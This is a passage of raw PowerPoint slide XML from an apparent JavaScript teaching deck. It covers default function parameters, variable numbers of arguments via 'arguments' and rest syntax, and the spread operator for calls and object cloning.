              <a:buNone/>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console</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">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tellSecret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>());</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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theEnd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>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376AC251-6FBC-4A92-9629-87FD58E4FEC4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="260350"/>
            <a:ext cx="10972800" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Default Parameters for Functions</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56323" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4359371C-ED3A-49BA-AB27-7C7A38243138}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="263525" y="1268412"/>
            <a:ext cx="11593513" cy="5184923"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>It is often a good idea to provide sensible (and secure defaults). Saves typing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>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printMany</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n</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p>
          <a:p>
            <a:pPr marL="400050" lvl="1"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while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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printMany</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"two"</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marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printMany</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"five"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Note! Any JS function can be called with any number of parameters error (extra will be silently ignored)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printMany</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"test"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>4</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"extra"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2800" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49"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AD97F1E3-18EE-4609-A69C-6181CDBC99F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Variable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Number of Arguments</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57347" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8A8EBD11-1C43-44F8-B82E-E834DC23C0F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="595888" y="1417638"/>
            <a:ext cx="10972800" cy="4983163"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t>Function arguments are found in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" i="1" dirty="0"/>
              <a:t>arguments</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
              <a:t> array-alike-object, which can be iterated and indexed, but newer browsers have an easy … shorthand, called rest operator.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printSeveral</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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arg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>of</a:t>
            </a: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arguments</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arg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printSeveral</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ding</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dong</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nobody</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> home"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="fi-FI" sz="2400" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printValues</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values</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>of</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values</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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="400050" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>printValues</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>100</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"cat"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>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2110672-CE70-4DD3-8B5E-31E1D0391C31}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Spread Operator …</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0051AA13-DFBF-49A4-B985-FFF4429D8889}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4925144"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>Spread syntax (...) allows an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>iterable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>, such as an array expression or string to be expanded, in places where zero or more arguments (for function calls) or elements (for array literals) are expected, or an object expression to be expanded in places where zero or more key-value pairs (for object literals) are expected.</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product</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</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y</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z</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>z</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numbers</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1</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2</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10</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array</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>spread</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with</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> ...</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product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numbers</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20</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product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apply</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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null</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numbers</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20</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008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obj1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>foo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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bar</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x:</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42</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obj2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>foo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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baz</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y:</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13</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clonedObj</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = { ...</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>obj1</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clonedObj</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Object { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
